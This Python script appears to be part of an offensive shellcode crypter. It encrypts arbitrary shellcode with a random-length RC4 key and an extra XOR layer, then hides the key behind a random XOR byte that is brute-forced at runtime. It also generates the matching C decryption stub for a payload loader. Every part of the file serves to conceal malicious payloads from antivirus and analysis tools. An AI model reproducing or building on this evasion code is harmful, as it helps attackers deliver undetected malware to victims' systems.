import argparse
import subprocess
import os
from itertools import cycle
from RC4Encryption import RC4Encryption
from random import randint

def encryptRC4(shellcode):

    key = os.urandom(randint(35,100)) # Generate an RC4 key of random length 35 - 100 bytes
    print(f"[!] RC4 key length: {len(key)}")
    firstbyte = key[0]

    # Encrypt the shellcode with the RC4 key
    rc4 = RC4Encryption(key)
    rc4.make_key()
    encrypted = rc4.encrypt(b''.join(shellcode))

    # Afterwards, XOR the encrypted shellcode with the last byte of the key
    lastByte = key[-1].to_bytes(1,byteorder='big')
    encrypted = bytes(a ^ b for a, b in zip(encrypted, cycle(lastByte)))

    # XOR'ing RC4 key
    xorByte = os.urandom(1) # Generate a random XOR byte to brute force at runtime
    encKey = bytes(a ^ b for a, b in zip(key, cycle(xorByte))) # Encrypt the RC4 key with it

    return encrypted, encKey, firstbyte

def rc4Blob(encKey, firstbyte):

    # Insert the XOR first byte and encrypted RC4 key.
    blob = f"\tBYTE bFirstByte = 0x{firstbyte.to_bytes(1,byteorder='big').hex()};\n"
    blob += "\tPBYTE pKey = NULL;\n"
    blob += "\tBYTE pEncKey[] = { "
    for i in range(0,len(encKey)):
        if i != len(encKey)-1:
            blob += f"0x{encKey[i].to_bytes(1,byteorder='big').hex()}, "
        else:
            blob += f"0x{encKey[i].to_bytes(1,byteorder='big').hex()} " + "};\n"

    # Brute-force decrypt the cleartext RC4 key.
    blob += "\tBruteDecryption(bFirstByte, pEncKey, sizeof(pEncKey), &pKey);\n"

    # XOR the encrypted shellcode with the last byte of the cleartext RC4 key.
    blob += "\tfor (size_t i = 0; i < sPayloadSize; i++){\n"
    blob += "\t\t pPayload[i] = pPayload[i] ^ pKey[sizeof(pEncKey)-1];\n"
    blob += "\t}\n"

    # RC4-decrypt the encrypted shellcode.
    blob += "\tRc4Context ctx = { 0 };\n"
    blob += "\tBYTE pTemp[sizeof(pPayload)];\n"
    blob += "\trc4Init(&ctx, pKey, sizeof(pEncKey));\n"
    blob += "\trc4Cipher(&ctx, pPayload, pTemp, sizeof(pPayload));\n"
    blob += """\tfor (int i = 0;i < sizeof(pPayload);i++)
    {
    pPayload[i] = pTemp[i];
    }\n"""

    return blob